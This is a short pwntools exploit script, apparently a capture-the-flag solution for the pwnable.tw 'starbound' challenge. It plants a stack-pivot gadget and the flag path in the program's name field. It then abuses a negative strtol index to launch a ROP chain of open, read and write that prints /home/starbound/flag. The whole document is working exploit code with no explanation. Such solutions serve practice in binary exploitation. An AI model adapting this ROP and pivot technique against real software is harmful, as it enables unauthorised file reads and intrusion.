from pwn import *
r = remote('chall.pwnable.tw', 10202)
#r = process('./starbound')

open_addr = 0x8048970
read_addr = 0x8048a70
write_addr = 0x8048a30

double_pop = 0x80498a9
triple_pop = 0x80494da
add_esp_1c = 0x8048e48

s = 0x80580D4 # target string address
buf = 0x80550c0

payload = p32(open_addr) + p32(triple_pop) + p32(s) + p32(0) * 2
payload += p32(read_addr) + p32(triple_pop) + p32(3) + p32(buf) + p32(200)
payload += p32(write_addr) + p32(triple_pop) + p32(1) + p32(buf) + p32(200)

# set name
r.recvuntil('>')
r.sendline("6")
r.recvuntil('>')
r.sendline('2')
r.recvuntil(':')
target = "/home/starbound/flag"
r.sendline(p32(add_esp_1c) + target)

raw_input('pause')

# strtol overflow
r.recvuntil('>')
r.sendline('1')
r.recvuntil('>')
r.sendline('-33' + "abcde" + payload)  # name offset

r.interactive()

